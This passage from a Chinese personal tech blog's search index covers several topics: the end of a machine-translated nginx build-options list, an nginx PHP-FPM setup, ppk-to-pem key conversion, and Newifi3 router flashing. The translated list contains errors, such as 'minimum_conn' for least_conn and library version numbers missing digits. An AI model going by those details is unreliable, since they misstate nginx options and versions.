ngx_http_ssi_module模块的响应。</code></pre><p>–without-http_userid_module</p><pre><code>禁用构建ngx_http_userid_module 模块，该 模块设置适用于客户端标识的cookie。</code></pre><p>–without-http_access_module</p><pre><code>禁用构建ngx_http_access_module 模块，该 模块允许限制对某些客户端地址的访问。</code></pre><p>–without-http_auth_basic_module</p><pre><code>禁用构建ngx_http_auth_basic_module 模块，该 模块允许通过使用“ HTTP基本身份验证”协议验证用户名和密码来限制对资源的访问。</code></pre><p>–without-http_mirror_module</p><pre><code>禁用构建ngx_http_mirror_module 模块，该 模块通过创建后台镜像子请求来实现原始请求的镜像。</code></pre><p>–without-http_autoindex_module</p><pre><code>禁用构建 ngx_http_autoindex_module 模块，以处理以斜杠（&apos; /&apos;）结尾的请求，并在ngx_http_index_module模块找不到索引文件的情况下生成目录列表 。</code></pre><p>–without-http_geo_module</p><pre><code>禁用构建ngx_http_geo_module 模块，该 模块创建的变量的值取决于客户端IP地址。</code></pre><p>–without-http_map_module</p><pre><code>禁用构建ngx_http_map_module 模块，该 模块创建的变量的值取决于其他变量的值。</code></pre><p>–without-http_split_clients_module</p><pre><code>禁用构建ngx_http_split_clients_module 模块，该 模块创建用于A / B测试的变量。</code></pre><p>–without-http_referer_module</p><pre><code>禁用构建ngx_http_referer_module 模块，该 模块可以阻止对“ Referer”标头字段中具有无效值的请求的站点访问。</code></pre><p>–without-http_rewrite_module</p><pre><code>禁用构建允许HTTP服务器 重定向请求并更改请求URI的模块。构建和运行此模块需要PCRE库。</code></pre><p>–without-http_proxy_module</p><pre><code>禁用构建HTTP服务器 代理模块。</code></pre><p>–without-http_fastcgi_module</p><pre><code>禁用构建 将请求传递到FastCGI服务器的 ngx_http_fastcgi_module模块。</code></pre><p>–without-http_uwsgi_module</p><pre><code>禁用构建 将请求传递到uwsgi服务器的 ngx_http_uwsgi_module模块。</code></pre><p>–without-http_scgi_module</p><pre><code>禁用构建 将请求传递到SCGI服务器的 ngx_http_scgi_module模块。</code></pre><p>–without-http_grpc_module</p><pre><code>禁用构建 将请求传递到gRPC服务器的 ngx_http_grpc_module模块。</code></pre><p>–without-http_memcached_module</p><pre><code>禁用构建ngx_http_memcached_module 模块，该 模块从memcached服务器获取响应。</code></pre><p>–without-http_limit_conn_module</p><pre><code>禁用构建ngx_http_limit_conn_module 模块，该 模块限制每个键的连接数，例如，单个IP地址的连接数。</code></pre><p>–without-http_limit_req_module</p><pre><code>禁用构建ngx_http_limit_req_module 模块，该 模块限制每个密钥的请求处理速率，例如，来自单个IP地址的请求的处理速率。</code></pre><p>–without-http_empty_gif_module</p><pre><code>禁用构建发出单像素透明GIF的模块 。</code></pre><p>–without-http_browser_module</p><pre><code>禁用构建ngx_http_browser_module 模块，该 模块创建的变量的值取决于“ User-Agent”请求标头字段的值。</code></pre><p>–without-http_upstream_hash_module</p><pre><code>禁用构建实现哈希 负载平衡方法的模块 。</code></pre><p>–without-http_upstream_ip_hash_module</p><pre><code>禁用构建实现ip_hash 负载平衡方法的模块 。</code></pre><p>–without-http_upstream_least_conn_module</p><pre><code>禁用构建实现了minimum_conn 负载平衡方法的模块 。</code></pre><p>–without-http_upstream_keepalive_module</p><pre><code>禁用构建一个模块来提供 对上游服务器连接的缓存。</code></pre><p>–without-http_upstream_zone_module</p><pre><code>禁用构建模块，该模块可以将上游组的运行时状态存储在共享内存 区域中。</code></pre><p>–with-http_perl_module 和 –with-http_perl_module=dynamic</p><pre><code>支持构建 嵌入式Perl模块。默认情况下未构建此模块。</code></pre><p>–with-perl_modules_path=path</p><pre><code>定义一个目录，该目录将保留Perl模块。</code></pre><p>–with-perl=path</p><pre><code>设置Perl二进制文件的名称。</code></pre><p>–http-log-path=path</p><pre><code>设置HTTP服务器的主请求日志文件的名称。安装后，可以始终nginx.conf使用access_log伪指令在配置文件中 更改文件名 。默认情况下，文件名为 prefix/logs/access.log。</code></pre><p>–http-client-body-temp-path=path</p><pre><code>定义用于存储包含客户端请求正文的临时文件的目录。安装后，可以始终nginx.conf使用client_body_temp_path 指令在配置文件中 更改目录 。默认情况下，目录名为 prefix/client_body_temp。</code></pre><p>–http-proxy-temp-path=path</p><pre><code>定义一个目录，用于存储包含从代理服务器接收到的数据的临时文件。安装后，可以始终nginx.conf使用proxy_temp_path 指令在配置文件中 更改目录 。默认情况下，目录名为 prefix/proxy_temp。</code></pre><p>–http-fastcgi-temp-path=path</p><pre><code>定义一个目录，用于存储包含从FastCGI服务器接收到的数据的临时文件。安装后，可以始终nginx.conf使用fastcgi_temp_path 指令在配置文件中 更改目录 。默认情况下，目录名为 prefix/fastcgi_temp。</code></pre><p>–http-uwsgi-temp-path=path</p><pre><code>定义一个目录，用于存储带有从uwsgi服务器接收到的数据的临时文件。安装后，可以始终nginx.conf使用uwsgi_temp_path 指令在配置文件中 更改目录 。默认情况下，目录名为 prefix/uwsgi_temp。</code></pre><p>–http-scgi-temp-path=path</p><pre><code>定义一个目录，用于存储带有从SCGI服务器接收到的数据的临时文件。安装后，可以始终nginx.conf使用scgi_temp_path 指令在配置文件中 更改目录 。默认情况下，目录名为 prefix/scgi_temp。</code></pre><p>–without-http</p><pre><code>禁用HTTP服务器。</code></pre><p>–without-http-cache</p><pre><code>禁用HTTP缓存。</code></pre><p>–with-mail 和 –with-mail=dynamic</p><pre><code>启用POP3 / IMAP4 / SMTP 邮件代理服务器。</code></pre><p>–with-mail_ssl_module</p><pre><code>支持构建一个模块，该模块 向邮件代理服务器添加 SSL / TLS协议支持。默认情况下未构建此模块。需要OpenSSL库来构建和运行此模块。</code></pre><p>–without-mail_pop3_module</p><pre><code>在邮件代理服务器中 禁用POP3协议。</code></pre><p>–without-mail_imap_module</p><pre><code>在邮件代理服务器中 禁用IMAP协议。</code></pre><p>–without-mail_smtp_module</p><pre><code>在邮件代理服务器中 禁用SMTP协议。</code></pre><p>–with-stream 和 –with-stream=dynamic</p><pre><code>支持构建 用于通用TCP / UDP代理和负载平衡的 流模块。默认情况下未构建此模块。</code></pre><p>–with-stream_ssl_module</p><pre><code>支持构建一个模块，该模块 向流模块添加 SSL / TLS协议支持。默认情况下未构建此模块。需要OpenSSL库来构建和运行此模块。</code></pre><p>–with-stream_realip_module</p><pre><code>启用构建ngx_stream_realip_module 模块的功能，该 模块将客户端地址更改为PROXY协议标头中发送的地址。默认情况下未构建此模块。</code></pre><p>–with-stream_geoip_module 和 –with-stream_geoip_module=dynamic</p><pre><code>支持构建ngx_stream_geoip_module 模块，该 模块根据客户端IP地址和预编译的MaxMind数据库创建变量 。默认情况下未构建此模块。</code></pre><p>–with-stream_ssl_preread_module</p><pre><code>支持构建ngx_stream_ssl_preread_module 模块，该 模块允许从ClientHello 消息中提取信息， 而无需终止SSL / TLS。默认情况下未构建此模块。</code></pre><p>–without-stream_limit_conn_module</p><pre><code>禁用构建ngx_stream_limit_conn_module 模块，该 模块限制每个键的连接数，例如，单个IP地址的连接数。</code></pre><p>–without-stream_access_module</p><pre><code>禁用构建ngx_stream_access_module 模块，该 模块允许限制对某些客户端地址的访问。</code></pre><p>–without-stream_geo_module</p><pre><code>禁用构建ngx_stream_geo_module 模块，该 模块创建的变量值取决于客户端IP地址。</code></pre><p>–without-stream_map_module</p><pre><code>禁用构建ngx_stream_map_module 模块，该 模块创建的变量值取决于其他变量的值。</code></pre><p>–without-stream_split_clients_module</p><pre><code>禁用构建ngx_stream_split_clients_module 模块，该 模块创建用于A / B测试的变量。</code></pre><p>–without-stream_return_module</p><pre><code>禁用构建ngx_stream_return_module 模块，该 模块向客户端发送一些指定的值，然后关闭连接。</code></pre><p>–without-stream_upstream_hash_module</p><pre><code>禁用构建实现哈希 负载平衡方法的模块 。</code></pre><p>–without-stream_upstream_least_conn_module</p><pre><code>禁用构建实现了minimum_conn 负载平衡方法的模块 。</code></pre><p>–without-stream_upstream_zone_module</p><pre><code>禁用构建模块，该模块可以将上游组的运行时状态存储在共享内存 区域中。</code></pre><p>–with-google_perftools_module</p><pre><code>允许构建ngx_google_perftools_module 模块，该 模块可以使用Google Performance Tools对nginx工作进程进行 性能分析。该模块适用于Nginx开发人员，默认情况下未构建。</code></pre><p>–with-cpp_test_module</p><pre><code>启用构建 ngx_cpp_test_module模块。</code></pre><p>–add-module=path</p><pre><code>启用外部模块。</code></pre><p>–add-dynamic-module=path</p><pre><code>启用外部动态模块。</code></pre><p>–with-compat</p><pre><code>启用动态模块兼容性。</code></pre><p>–with-cc=path</p><pre><code>设置C编译器的名称。</code></pre><p>–with-cpp=path</p><pre><code>设置C预处理器的名称。</code></pre><p>–with-cc-opt=parameters</p><pre><code>设置将添加到CFLAGS变量的其他参数。在FreeBSD下使用系统PCRE库时， --with-cc-opt=&quot;-I /usr/local/include&quot; 应指定。如果select()需要增加支持的文件数量，也可以在此处指定，例如： --with-cc-opt=&quot;-D FD_SETSIZE=2048&quot;。</code></pre><p>–with-ld-opt=parameters</p><pre><code>设置将在链接期间使用的其他参数。在FreeBSD下使用系统PCRE库时， --with-ld-opt=&quot;-L /usr/local/lib&quot; 应指定。</code></pre><p>–with-cpu-opt=cpu</p><pre><code>每个指定的CPU能够使建筑： pentium，pentiumpro， pentium3，pentium4， athlon，opteron， sparc32，sparc64， ppc64。</code></pre><p>–without-pcre</p><pre><code>禁用PCRE库的使用。</code></pre><p>–with-pcre</p><pre><code>强制使用PCRE库。</code></pre><p>–with-pcre=path</p><pre><code>设置PCRE库源的路径。需要从PCRE站点下载并分发库分发（版本4.4 — 8.43） 。其余的由nginx的./configure和完成 make。该库对于location指令中的正则表达式支持和 ngx_http_rewrite_module 模块是必需的 。</code></pre><p>–with-pcre-opt=parameters</p><pre><code>为PCRE设置其他构建选项。</code></pre><p>–with-pcre-jit</p><pre><code>使用“及时编译”支持（..2，pcre_jit指令）构建PCRE库 。</code></pre><p>–with-zlib=path</p><pre><code>设置zlib库源的路径。需要从zlib站点下载库发行版（版本..3-.2.） 并解压缩。其余的由nginx的./configure和完成 make。ngx_http_gzip_module模块需要该库 。</code></pre><p>–with-zlib-opt=parameters</p><pre><code>为zlib设置其他构建选项。</code></pre><p>–with-zlib-asm=cpu</p><pre><code>使得能够使用指定的CPU中的一个优化的zlib汇编源程序： pentium，pentiumpro。</code></pre><p>–with-libatomic</p><pre><code>强制使用libatomic_ops库。</code></pre><p>–with-libatomic=path</p><pre><code>设置libatomic_ops库源的路径。</code></pre><p>–with-openssl=path</p><pre><code>设置OpenSSL库源的路径。</code></pre><p>–with-openssl-opt=parameters</p><pre><code>为OpenSSL设置其他构建选项。</code></pre><p>–with-debug</p><pre><code>启用调试日志</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Service </category>
          
          <category> Nginx </category>
          
          <category> Sortware </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Service </tag>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx配置PHP</title>
      <link href="/nginx%E9%85%8D%E7%BD%AEphp.htm"/>
      <url>/nginx%E9%85%8D%E7%BD%AEphp.htm</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx配置PHP"><a href="#Nginx配置PHP" class="headerlink" title="Nginx配置PHP"></a>Nginx配置PHP</h1><p>因为centos7内置的源php为5.4老版本，先更换yum源</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">yum install epel-release</span><br><span class="line">rpm -Uvh https:<span class="regexp">//</span>dl.fedoraproject.org<span class="regexp">/pub/</span>epel/epel-release-latest-<span class="number">7</span>.noarch.rpm</span><br><span class="line">rpm -Uvh https:<span class="regexp">//mi</span>rror.webtatic.com<span class="regexp">/yum/</span>el7/webtatic-release.rpm</span><br></pre></td></tr></table></figure><p>如果已经安装了旧版本先完全删除后再安装</p><figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">yum -y install php72w php72w-cli php72w-common php72w-devel php72w-embedded php72w-fpm php72w-gd php72w-mbstring php72w-mysqlnd php72w-opcache php72w-pdo php72w-xml</span><br></pre></td></tr></table></figure><p>在nginx的conf文件配置如下</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ [^/]\.php(/|$)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">#comment try_files $uri = 404;to enable pathinfo try_files $uri = 404;</span></span><br><span class="line">        <span class="attribute">fastcgi_pass</span> <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">        <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">        <span class="comment">#include fastcgi.conf;#include pathinfo.conf;</span></span><br><span class="line">        <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">        <span class="attribute">set</span> <span class="variable">$real_script_name</span> <span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        <span class="attribute">if</span> (<span class="variable">$fastcgi_script_name</span> <span class="regexp">~ &quot;^(.+?\.php)(/.+)$&quot;)</span>&#123;</span><br><span class="line">                <span class="attribute">set</span> <span class="variable">$real_script_name</span> <span class="variable">$1</span>;</span><br><span class="line">                <span class="attribute">set</span> <span class="variable">$path_info</span> <span class="variable">$2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$real_script_name</span>;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> SCRIPT_NAME <span class="variable">$real_script_name</span>;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> PATH_INFO <span class="variable">$path_info</span>;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> APPLICATION_ENV <span class="string">&#x27;development&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Firewall </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Firewall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ppk密钥转pem密钥</title>
      <link href="/ppk%E5%AF%86%E9%92%A5%E8%BD%ACpem%E5%AF%86%E9%92%A5.htm"/>
      <url>/ppk%E5%AF%86%E9%92%A5%E8%BD%ACpem%E5%AF%86%E9%92%A5.htm</url>
      
        <content type="html"><![CDATA[<h1 id="ppk密钥转pem密钥"><a href="#ppk密钥转pem密钥" class="headerlink" title="ppk密钥转pem密钥"></a>ppk密钥转pem密钥</h1><h5 id="需求-从win转Mac-服务器的密钥都是用puttygen生成的ppk-并且在win上面是使用putty进行ssh登陆-Mac系统虽然自带了Terminal-但是Mac下的Terminal使用-pem文件-而不是-ppk文件-而-pem文件可以从-ppk文件转换而来"><a href="#需求-从win转Mac-服务器的密钥都是用puttygen生成的ppk-并且在win上面是使用putty进行ssh登陆-Mac系统虽然自带了Terminal-但是Mac下的Terminal使用-pem文件-而不是-ppk文件-而-pem文件可以从-ppk文件转换而来" class="headerlink" title="需求:从win转Mac,服务器的密钥都是用puttygen生成的ppk,并且在win上面是使用putty进行ssh登陆,Mac系统虽然自带了Terminal,但是Mac下的Terminal使用.pem文件,而不是.ppk文件,而.pem文件可以从.ppk文件转换而来"></a>需求:从win转Mac,服务器的密钥都是用puttygen生成的ppk,并且在win上面是使用putty进行ssh登陆,Mac系统虽然自带了Terminal,但是Mac下的Terminal使用.pem文件,而不是.ppk文件,而.pem文件可以从.ppk文件转换而来</h5><h5 id="首选方法是在Mac系统下安装putty并进行转换，步骤如下："><a href="#首选方法是在Mac系统下安装putty并进行转换，步骤如下：" class="headerlink" title="首选方法是在Mac系统下安装putty并进行转换，步骤如下："></a>首选方法是在Mac系统下安装putty并进行转换，步骤如下：</h5><ol><li>使用Homebrew安装putty(homebrew是Mac下的包管理工具)：<br><code>$brew install putty</code><br>同时会安装puttygen。</li><li>使用puttygen从.ppk文件产生.pem文件：<br><code>$puttygen privatekey.ppk -O private-openssh -o privatekey.pem</code><br>注意：前面一个是大写O，后面一个小写o。</li><li>使用.pem远程登录<br><code>ssh -i privatekey.pem user@my.server.com -p port</code><br>或者<br>直接使用<code>~/.ssh/config</code>配置别称登陆<br><code>ssh name</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> MacOs </category>
          
          <category> ppk密钥转pem密钥 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Mac </tag>
            
            <tag> ppk </tag>
            
            <tag> pem </tag>
            
            <tag> ppk转pem </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Newifi3新新新手刷机教程</title>
      <link href="/Newifi3wipe.htm"/>
      <url>/Newifi3wipe.htm</url>
      
        <content type="html"><![CDATA[<h1 id="新路由3刷机教程"><a href="#新路由3刷机教程" class="headerlink" title="新路由3刷机教程"></a>新路由3刷机教程</h1><ol><li></li><li></li><li></li><li><p>首先确保你路由器正常进入官方系统(即192.168.99.1)<br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/IMG_7862.PNG" alt="IMG_7862"></p></li><li><p>输入账户密码进入管理主界面<br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/IMG_7866.PNG" alt="IMG_7866"></p></li><li><p>在地址栏输入<strong><u><a href="https://192.168.99.1/newifi/ifiwen_hss.html">https://192.168.99.1/newifi/ifiwen_hss.html</a></u></strong>之后,看到success即成功打开SSH<br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200323170823338.png" alt="image-20200323170823338"></p></li><li></li><li><p>用一条网线将路由器的任一Lan口和计算机网口相连</p></li><li><p>路由器拔电源<br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/IMG_7554.jpg" alt="IMG_7554"></p></li><li><p>按住电源插口旁边的reset键不放,然后插上电源(手不要松开reset键)</p>  <img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/IMG_7555.jpg" alt="IMG_7555"></li><li><p>然后看到全部灯一起闪烁几次<br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/IMG_7557.jpg" alt="IMG_7557"></p></li><li><p>然后剩下电源蓝灯亮就可以松手(松开reset键)<br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/IMG_7558.jpg" alt="IMG_7558"></p></li><li><p>然后去电脑浏览器地址输入192.168.1.1<br>就能进入Breed控制台</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/IMG_7559.jpg" alt="IMG_7559"></p></li><li><p>进入固件更新,勾选固件,选择文件(刷机包),按上传即可,然后点开始更新<br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/IMG_7561.jpg" alt="IMG_7561"></p></li><li><p>更新完后等2-3分钟即可食用,看到2.4G和5G的指示灯亮之后基本刷机成功</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 新路由3刷机教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由器 </tag>
            
            <tag> 新路由3刷机教程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
